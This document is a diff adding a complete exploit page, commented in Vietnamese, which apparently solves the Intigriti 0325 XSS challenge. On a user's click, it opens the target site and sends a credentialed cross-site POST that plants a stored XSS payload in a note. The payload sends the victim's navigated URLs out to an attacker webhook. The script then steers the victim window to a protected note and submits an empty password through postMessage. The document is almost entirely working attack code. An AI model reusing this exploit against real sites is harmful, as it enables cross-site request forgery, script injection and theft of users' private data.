@@ -1,0 +1,63 @@
+<script>
+    // Khai báo biến chứa URL mục tiêu của ứng dụng đang bị kiểm thử
+    const TARGET_HOST = 'https://challenge-0325.intigriti.io';
+  
+    // URL webhook để gửi dữ liệu thu được (giả sử của attacker)
+    const WEBHOOK_URL = '<WEBHOOK_URL>';
+  
+    // Hàm sleep: tạm dừng một khoảng thời gian (ms mili-giây)
+    const sleep = ms => new Promise(res => setTimeout(res, ms));
+  
+    // Khởi tạo biến win để lưu cửa sổ mới được mở
+    let win = null;
+  
+    // Lắng nghe sự kiện "message" từ cửa sổ khác (window.postMessage)
+    window.addEventListener('message', (e) => {
+      const { type, noteId } = e.data;
+  
+      // Nếu nhận được message có type là 'success' và có noteId
+      if (type === 'success' && noteId) {
+        // Điều hướng cửa sổ tới trang note cụ thể
+        win.location = `${TARGET_HOST}/note/${noteId}`;
+      }
+    });
+  
+    // Khi người dùng click vào bất kỳ chỗ nào trên trang
+    document.addEventListener('click', async () => {
+      // Mở cửa sổ mới trỏ đến trang /notes
+      win = window.open(`${TARGET_HOST}/notes`);
+  
+      // Chờ 500ms để trang load
+      await sleep(500);
+  
+      // Gửi request tạo note chứa payload XSS
+      fetch(`${TARGET_HOST}/api/post`, {
+        body: new Blob([JSON.stringify({
+          title: 'test', // tiêu đề note
+          content: [  // nội dung có chèn payload XSS
+            "<img/src/onerror='history.replaceState = history.pushState; window.onhashchange = e => fetch(`" + 
+            WEBHOOK_URL + "?u=${encodeURIComponent(e.newURL)}`); setTimeout(() => location.hash = `a`, 1000); setTimeout(() => history.go(-2), 1500)'>"
+          ],
+          use_password: false
+        })]),
+        method: 'POST',
+        credentials: 'include' // Gửi kèm cookie session (nếu có)
+      });
+  
+      // Chờ thêm 500ms để note được tạo
+      await sleep(500);
+  
+      // Điều hướng cửa sổ tới trang note được bảo vệ (password-protected)
+      win.location = `${TARGET_HOST}/protected-note`;
+  
+      // Chờ thêm 500ms để trang load
+      await sleep(500);
+  
+      // Gửi message tới cửa sổ con để nhập password (ở đây là rỗng '')
+      win.postMessage({ type: 'submitPassword', password: '' }, '*');
+    });
+  </script>
+  
+
+
+  
